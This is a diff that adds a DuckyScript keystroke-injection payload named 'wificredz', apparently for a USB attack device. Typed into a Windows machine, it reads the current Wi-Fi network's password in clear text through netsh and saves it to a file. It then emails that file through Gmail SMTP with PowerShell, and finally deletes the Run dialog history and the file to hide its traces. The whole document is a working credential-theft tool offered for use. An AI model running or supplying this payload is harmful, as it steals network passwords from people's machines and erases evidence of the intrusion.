@@ -1,0 +1,60 @@
+REM --> wificredz
+REM --> AUTHOR Blackbeard1st
+
+REM --> Wait on Device Interface
+DELAY 1000
+REM --> Open cmd
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 200
+REM --> set variable to get SSID-Name
+STRING for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
+ENTER
+DELAY 100
+REM --> save output to wifi.sec
+STRING netsh wlan show profiles %A% key=clear>wifi.sec
+ENTER
+DELAY 100
+STRING powershell
+ENTER
+DELAY 100
+
+REM --> Mail Credz
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('yourmail@gmail.com', 'yourpassword')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+REM --> you can e-mail your self
+STRING $ReportEmail.From = 'yourmail@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('yourmail@gmail.com')
+ENTER
+STRING $ReportEmail.Subject = 'my_wifi_credz_now'
+ENTER
+STRING $ReportEmail.Body = (Get-Content wifi.sec | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+
+REM --> Delete History
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+DELAY 100
+
+REM --> Delete stolen credz
+STRING del /f wifi.sec
+ENTER
+DELAY 100
+STRING exit
+ENTER
